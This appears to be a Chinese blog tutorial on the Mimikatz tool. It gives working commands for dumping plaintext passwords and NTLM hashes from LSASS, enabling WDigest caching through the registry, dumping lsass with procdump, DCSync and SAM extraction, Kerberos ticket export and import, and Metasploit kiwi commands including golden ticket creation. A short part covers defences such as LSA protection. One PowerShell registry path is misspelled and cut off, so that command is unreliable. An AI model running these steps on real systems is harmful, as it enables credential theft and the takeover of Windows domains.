项目地址：https://github.com/gentilkiwi/mimikatz/

## 一、工具简介

Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。

**注意：**  
当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。
    
    
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
    
    

## 二、Mimikatz命令
    
    
    cls：       清屏
    standard：  标准模块，基本命令
    crypto：    加密相关模块
    sekurlsa：  与证书相关的模块
    kerberos：  kerberos模块
    privilege： 提权相关模块
    process：   进程相关模块
    serivce：   服务相关模块
    lsadump：   LsaDump模块
    ts：        终端服务器模块
    event：     事件模块
    misc：      杂项模块
    token：     令牌操作模块
    vault：     Windows 、证书模块
    minesweeper：Mine Sweeper模块
    net：
    dpapi：     DPAPI模块（通过API或RAW访问） [数据保护应用程序编程接口]
    busylight： BusyLight Module
    sysenv：    系统环境值模块
    sid：       安全标识符模块
    iis：       IIS XML配置模块
    rpc：       mimikatz的RPC控制
    sr98：      用于SR98设备和T5577目标的RF模块
    rdm：       RDM（830AL）器件的射频模块
    acr：       ACR模块
    version：   查看版本
    exit：      退出
    
    

**提升权限 命令：privilege::debug **

mimikatz许多功能都需要管理员权限，如果不是管理员权限不能debug  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021012816405872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDQxMjAzNw==,size_16,color_FFFFFF,t_70)

## 三、示例

### 抓取明文密码

在windows2012以上的系统不能直接获取明文密码了，当可以搭配procdump+mimikatz获取密码。
    
    
    mimikatz # log
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
    
    

**示例：windows server 2003**  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210128164356956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDQxMjAzNw==,size_16,color_FFFFFF,t_70)

**分析命令执行后的内容：**

**msv：**这项是账户对应密码的各种加密协议的密文，可以看到有LM、NTLM和SHA1加密的密文  
**tspkg,wdigest,kerberos：**这个就是账户对应的明文密码了。有的时候这三个对应的也不是全部都是一样的，需要看服务器是什么角色。  
**SSP：**是最新登录到其他RDP终端的账户和密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210128165415581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDQxMjAzNw==,size_16,color_FFFFFF,t_70)

### 模块

#### sekurlsa模块
    
    
    sekurlsa::logonpasswords
    
    抓取用户NTLM哈希
    sekurlsa::msv
    
    加载dmp文件，并导出其中的明文密码
    sekurlsa::minidump lsass.dmp
    sekurlsa::logonpasswords full
    
    导出lsass.exe进程中所有的票据
    sekurlsa::tickets /export
    
    

#### kerberos模块
    
    
    列出系统中的票据
    kerberos::list
    kerberos::tgt
    
    清除系统中的票据
    kerberos::purge
    
    导入票据到系统中
    kerberos::ptc 票据路径
    
    

#### lsadump模块
    
    
    在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
    lsadump::dcsync /domain:kevin.com /user:root
    
    (在域控上执行)读取所有域用户的哈希
    lsadump::lsa /patch
    
    从sam.hive和system.hive文件中获得NTLM Hash
    lsadump::sam /sam:sam.hive /system:system.hive
    
    从本地SAM文件中读取密码哈希
    token::elevate
    lsadump::sam
    
    

#### wdigest

WDigest协议是在WindowsXP中被引入的,旨在与HTTP协议一起用于身份认证。默认情况下,Microsoft在多个版本的Windows(Windows XP-Windows 8.0和Windows Server 2003-Windows Server 2012)中启用了此协议,这意味着纯文本密码存储在LSASS(本地安全授权子系统服务)进程中。 Mimikatz可以与LSASS交互,允许攻击者通过以下命令检索这些凭据
    
    
    mimikatz #privilege::debug
    mimikatz #sekurlsa::wdigest
    
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210129161936943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDQxMjAzNw==,size_16,color_FFFFFF,t_70)  
在windows2012系统以及以上的系统之后这个默认是关闭的如果在 win2008 之前的系统上打了 KB2871997 补丁，那么就可以去启用或者禁用 WDigest。Windows Server2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。配置如下键值：
    
    
    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
    

UseLogonCredential 值设置为 0, WDigest 不把凭证缓存在内存；UseLogonCredential 值设置为 1, WDigest 就把凭证缓存在内存。  
使用powershell进行更改
    
    
    开启Wdigest Auth
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
    关闭Wdigest Auth
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid
    
    

#### LSA保护

如何防止mimikatz获取一些加密的密文进行PTH攻击呢！其实微软推出的补丁KB2871997是专门针对PTH攻击的补丁，但是如果PID为500的话，还是可以进行PTH攻击的！本地安全权限服务(LSASS)验证用户是否进行本地和远程登录,并实施本地安全策略。 Windows 8.1及更高版本的系统中,Microsoft为LSA提供了额外的保护,以防止不受信任的进程读取内存或代码注入。Windows 8.1之前的系统,攻击者可以执行Mimikatz命令来与LSA交互并检索存储在LSA内存中的明文密码。

这条命令修改键的值为1，即使获取了debug权限吗，也不能直接获取明文密码和hash

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f

#### 获取高版本Windows系统的密码凭证

使用procdump将lsass dump下来（需要管理员权限）
    
    
    procdump.exe -accepteula -ma lsass.exe 1.dmp
    
    

使用mimikatz读取密码
    
    
    mimikatz.exe "log" "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit
    
    

#### msf中kiwi模块

注：kiwi默认加载32位，如果目标系统位64位，将进程迁移到64位程序的进程中。

#### kiwi模块使用
    
    
    load kiwi //加载kiwi模块
    help kiwi //查看帮助
    
    

#### kiwi模块命令
    
    
    creds_all：列举所有凭据
    creds_kerberos：列举所有kerberos凭据
    creds_msv：列举所有msv凭据
    creds_ssp：列举所有ssp凭据
    creds_tspkg：列举所有tspkg凭据
    creds_wdigest：列举所有wdigest凭据
    dcsync：通过DCSync检索用户帐户信息
    dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
    golden_ticket_create：创建黄金票据
    kerberos_ticket_list：列举kerberos票据
    kerberos_ticket_purge：清除kerberos票据
    kerberos_ticket_use：使用kerberos票据
    kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
    lsa_dump_sam：dump出lsa的SAM
    lsa_dump_secrets：dump出lsa的密文
    password_change：修改密码
    wifi_list：列出当前用户的wifi配置文件
    wifi_list_shared：列出共享wifi配置文件/编码
    
    

#### creds_all

列举系统中的明文密码

#### kiwi_cmd

kiwi_cmd可以使用mimikatz中的所有功能，命令需要接上mimikatz的命令
    
    
    kikiwi_cmd sekurlsa::logonpasswords
    
    

更多用法参考链接：https://www.freebuf.com/articles/web/176796.html

**更多资源：**

1、web安全工具、渗透测试工具  
2、存在漏洞的网站源码与代码审计+漏洞复现教程、  
3、渗透测试学习视频、应急响应学习视频、代码审计学习视频、都是2019-2021年期间的较新视频  
4、应急响应真实案例复现靶场与应急响应教程

**收集整理在知识星球，可加入知识星球进行查看。也可搜索关注微信公众号：W小哥**  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420092210126.png#pic_center)
